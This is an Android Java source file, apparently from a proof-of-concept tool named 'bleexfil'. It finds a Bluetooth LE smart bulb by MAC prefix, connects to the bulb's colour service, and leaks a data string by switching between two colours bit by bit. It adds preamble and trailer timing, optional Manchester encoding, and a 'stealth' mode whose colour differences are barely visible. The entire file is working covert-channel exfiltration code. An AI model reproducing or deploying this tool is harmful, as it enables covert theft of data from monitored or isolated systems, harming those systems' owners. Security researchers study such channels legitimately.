package xyz.kripthor.bleexfil;

import android.bluetooth.BluetoothAdapter;
import android.bluetooth.BluetoothDevice;
import android.bluetooth.BluetoothGatt;
import android.bluetooth.le.BluetoothLeScanner;
import android.bluetooth.le.ScanCallback;
import android.bluetooth.le.ScanResult;
import android.bluetooth.le.ScanSettings;
import android.content.Context;
import android.util.Log;
import android.widget.EditText;
import android.widget.TextView;

import java.util.ArrayList;
import java.util.List;
import java.util.Random;

import static android.bluetooth.BluetoothDevice.TRANSPORT_LE;
import static android.bluetooth.BluetoothGatt.CONNECTION_PRIORITY_HIGH;
import static android.bluetooth.BluetoothProfile.STATE_DISCONNECTED;

/**
 * Created by kripthor on 20-11-2017.
 */

public class BlueThread extends Thread {

    private BluetoothAdapter mBluetoothAdapter;
    private BluetoothLeScanner mLEScanner;
    private ScanSettings settings;
    private BluetoothGatt mGatt;
    private boolean alive;
    private boolean lampFound;
    private BluetoothDevice lamp;
    private GattCallBack gattCallBack;
    private ArrayList<BluetoothDevice> mDeviceList;
    private Context parentContext;
    private Random random;
    private int TRANSMIT_MS = 200;
/*    private String zeroStringStealth = "01fe000053831000ffffff0050ef0000";
    private String oneStringStealth =  "01fe000053831000ff1fff0050ff0000";
    private String zeroStringNormal = "01fe000053831000ffffff00500f0000";
    private String oneStringNormal =  "01fe000053831000ff00ff0050ff0000";
  */
    private String zeroStringStealth = "56FFFFFF00F0AA";
    private String oneStringStealth =  "56FFFFF100F0AA";
    private String zeroStringNormal =  "56FFFFFF00F0AA";
    private String oneStringNormal =   "56FFFF0000F0AA";
    //private String zeroStringNormal =  "560000007F0FAA";
    //private String oneStringNormal =   "560000FF7F00AA";
    private String zeroString,oneString;
    public StringBuilder statusText;
    public String exfilData = "";
    public boolean stealth;
    public String mac = "";


    public BlueThread(Context context, BluetoothAdapter adapter) {
        mBluetoothAdapter = adapter;
        mLEScanner = mBluetoothAdapter.getBluetoothLeScanner();
        settings = new ScanSettings.Builder().setScanMode(ScanSettings.SCAN_MODE_BALANCED).build();
        mDeviceList = new ArrayList<BluetoothDevice>();
        alive = true;
        lampFound = false;
        gattCallBack = new GattCallBack();
        parentContext = context;
        random = new Random();
        statusText = new StringBuilder();
        zeroString = zeroStringNormal;
        oneString = oneStringNormal;
    }

    @Override
    public void run() {
       while (alive) {
           try {

               if (!lampFound) {
                   statusText.append("\n"+"Scanning for BLE devices...");
                   startScan();
                   sleep(3000);
                   stopScan();
                   sleep(500);
               }
               if (!lampFound) {
                for (BluetoothDevice bd:mDeviceList) {
                  Log.i("BLE Device", " found "+bd.getAddress());
                    statusText.append(".");
                    //if (bd.getAddress().startsWith("F4:4E:FD")||bd.getAddress().startsWith("F8:1D:78")||bd.getAddress().startsWith("C9:7C:02")||bd.getAddress().startsWith("00:E0:4C")||bd.getAddress().startsWith("18:08:11")) {
                    if (bd.getAddress().startsWith(mac)) {

                        Log.i("BLE Device", " LAMP found "+bd.getAddress());
                        statusText.append("\n"+"Found a smartbulb: "+bd.getAddress());
                        lampFound = true;
                        lamp = bd;
                   }
                }
               }

               if (lampFound && !gattCallBack.isConnected) {
                   statusText.append("\n"+"Connecting...");
                   connectLamp();
                   sleep(3000);
               }

               if (gattCallBack.isConnected && !gattCallBack.hasColorService) {
                   statusText.append("\n"+"Connected. Searching for color service...");
                   mGatt.requestConnectionPriority(CONNECTION_PRIORITY_HIGH);
                   mGatt.discoverServices();
                   sleep(3000);
               }

               if (gattCallBack.isConnected && gattCallBack.hasColorService) {
                   if (stealth) {
                       zeroString = zeroStringStealth;
                       oneString = oneStringStealth;
                   } else {
                       zeroString = zeroStringNormal;
                       oneString = oneStringNormal;
                   }
                   statusText.append("\n"+"Exfiltrating data ["+exfilData+"] in " + (stealth?"stealth mode: ":"normal mode: "));
                   sendString(exfilData,false);
                   sleep(1000);
               }

           } catch (Exception e) {
               e.printStackTrace();

           }
       }
        disconnectLamp();
    }




    private void connectLamp() {
        if (mGatt == null) {
            // TRANSPORT_LE IS ABSOLUTELY NECESSARY!
            mGatt = lamp.connectGatt(parentContext, false, gattCallBack,TRANSPORT_LE);

        } else {
            if (gattCallBack.state == STATE_DISCONNECTED) {
                disconnectLamp();
            }
        }
    }

    private void disconnectLamp() {
        if (mGatt != null) {
            mGatt.close();
            mGatt.disconnect();
            mGatt = null;
            mDeviceList = new ArrayList<BluetoothDevice>();
            lampFound = false;
            gattCallBack = new GattCallBack();
            statusText.append("\n"+"Disconnected.");
        }
    }

    public void die() {
        alive = false;
    }

    public void pause() {

    }


    public void stopScan(){
        mLEScanner.stopScan(mScanCallback);
        mLEScanner.flushPendingScanResults(mScanCallback);

    }

    public void startScan() {
        mLEScanner.startScan(null, settings, mScanCallback);
    }

    private ScanCallback mScanCallback = new ScanCallback() {
        @Override
        public void onScanResult(int callbackType, ScanResult result) {
            synchronized (mDeviceList) {
                BluetoothDevice btDevice = result.getDevice();
                if (!mDeviceList.contains(btDevice)) mDeviceList.add(btDevice);
            }
            Log.i("BLE ScanCallBack ", "Type: "+String.valueOf(callbackType)+"   Result: "+result.toString());
        }

        @Override
        public void onBatchScanResults(List<ScanResult> results) {
            for (ScanResult sr : results) {
                Log.i("BLE BatchResults", sr.toString());
            }
        }

        @Override
        public void onScanFailed(int errorCode) {
            Log.e("BLE ScanFailed", "Error Code: " + errorCode);
        }
    };




    private byte[] packetFromHexString(String s) {
        //ALWAYS RETURN 20 Byte packet, bad writes otherwise
        byte packet[] = new byte[20];
        byte buf[] = hexStringToByteArray(s);
        for (int i = 0; i < buf.length && i < 20; i++) {
            packet[i] = buf[i];
        }
        return packet;
    }

    private byte[] hexStringToByteArray(String s) {
        int len = s.length();
        byte[] data = new byte[len / 2];
        for (int i = 0; i < len; i += 2) {
            data[i / 2] = (byte) ((Character.digit(s.charAt(i), 16) << 4)
                    + Character.digit(s.charAt(i+1), 16));
        }
        return data;
    }

    private String bytesToHex(byte[] in) {
        final StringBuilder builder = new StringBuilder();
        for(byte b : in) {
            builder.append(String.format("%02x", b));
        }
        return builder.toString();
    }

    private String getRandomColorCode() {
        byte b[] = new byte [3];
        random.nextBytes(b);
        return bytesToHex(b);
    }

    private void sendBit(int bit) {
        long start;
        if (!alive) return;
        try {
            if (bit == 1) {
                gattCallBack.colorChar.setValue(packetFromHexString(oneString));
                start = System.currentTimeMillis();
                mGatt.writeCharacteristic(gattCallBack.colorChar);
                while (System.currentTimeMillis() - start < TRANSMIT_MS) sleep(5);
            } else {
                gattCallBack.colorChar.setValue(packetFromHexString(zeroString));
                start = System.currentTimeMillis();
                mGatt.writeCharacteristic(gattCallBack.colorChar);
                while (System.currentTimeMillis() - start < TRANSMIT_MS) sleep(5);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void sendBitManchesterEncoding(int bit) {
        long start;
        if (!alive) return;
        try {
            if (bit == 1) {
                gattCallBack.colorChar.setValue(packetFromHexString(oneString));
                start = System.currentTimeMillis();
                mGatt.writeCharacteristic(gattCallBack.colorChar);
                while (System.currentTimeMillis() - start < TRANSMIT_MS) sleep(5);
                gattCallBack.colorChar.setValue(packetFromHexString(zeroString));
                start = System.currentTimeMillis();
                mGatt.writeCharacteristic(gattCallBack.colorChar);
                while (System.currentTimeMillis() - start < TRANSMIT_MS) sleep(5);
            } else {
                gattCallBack.colorChar.setValue(packetFromHexString(zeroString));
                start = System.currentTimeMillis();
                mGatt.writeCharacteristic(gattCallBack.colorChar);
                while (System.currentTimeMillis() - start < TRANSMIT_MS) sleep(5);
                gattCallBack.colorChar.setValue(packetFromHexString(oneString));
                start = System.currentTimeMillis();
                mGatt.writeCharacteristic(gattCallBack.colorChar);
                while (System.currentTimeMillis() - start < TRANSMIT_MS) sleep(5);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void sendString(String stringToSend, boolean manchesterEncoding) {

        for (int i = 0; i < stringToSend.length();i++) {
            sendByte(stringToSend.charAt(i),manchesterEncoding);
            statusText.append(stringToSend.charAt(i));
        }

    }

    private void sendByte(int byteToSend, boolean manchesterEncoding) {
        sendPreamble();

        if (!manchesterEncoding) {
            if ((byteToSend & 1) > 0) sendBit(1);
            else sendBit(0);
            if ((byteToSend & 2) > 0) sendBit(1);
            else sendBit(0);
            if ((byteToSend & 4) > 0) sendBit(1);
            else sendBit(0);
            if ((byteToSend & 8) > 0) sendBit(1);
            else sendBit(0);
            if ((byteToSend & 16) > 0) sendBit(1);
            else sendBit(0);
            if ((byteToSend & 32) > 0) sendBit(1);
            else sendBit(0);
            if ((byteToSend & 64) > 0) sendBit(1);
            else sendBit(0);
            if ((byteToSend & 128) > 0) sendBit(1);
            else sendBit(0);
        } else {
            if ((byteToSend & 1) > 0) sendBitManchesterEncoding(1);
            else sendBitManchesterEncoding(0);
            if ((byteToSend & 2) > 0) sendBitManchesterEncoding(1);
            else sendBitManchesterEncoding(0);
            if ((byteToSend & 4) > 0) sendBitManchesterEncoding(1);
            else sendBitManchesterEncoding(0);
            if ((byteToSend & 8) > 0) sendBitManchesterEncoding(1);
            else sendBitManchesterEncoding(0);
            if ((byteToSend & 16) > 0) sendBitManchesterEncoding(1);
            else sendBitManchesterEncoding(0);
            if ((byteToSend & 32) > 0) sendBitManchesterEncoding(1);
            else sendBitManchesterEncoding(0);
            if ((byteToSend & 64) > 0) sendBitManchesterEncoding(1);
            else sendBitManchesterEncoding(0);
            if ((byteToSend & 128) > 0) sendBitManchesterEncoding(1);
            else sendBitManchesterEncoding(0);

        }
        sendTrailer();
    }

    private void sendPreamble() {
        long start;
        try {
            gattCallBack.colorChar.setValue(packetFromHexString(oneString));
            start = System.currentTimeMillis();
            mGatt.writeCharacteristic(gattCallBack.colorChar);
            while (System.currentTimeMillis() - start < 1800) sleep(5);
            gattCallBack.colorChar.setValue(packetFromHexString(zeroString));
            start = System.currentTimeMillis();
            mGatt.writeCharacteristic(gattCallBack.colorChar);
            while (System.currentTimeMillis() - start < 400) sleep(5);

        } catch (InterruptedException e) {
            e.printStackTrace();
        }
    }

    private void sendTrailer() {
        long start;
        try {
            gattCallBack.colorChar.setValue(packetFromHexString(zeroString));
            start = System.currentTimeMillis();
            mGatt.writeCharacteristic(gattCallBack.colorChar);
            while (System.currentTimeMillis() - start < 200) sleep(5);
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
    }

    private void sendTest() {
        try {
            sendBit(1);
            sendBit(0);
            sendBit(1);
            sendBit(0);

            sendBit(1);
            sleep(1000);
            sendBit(0);
            sleep(1000);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

}
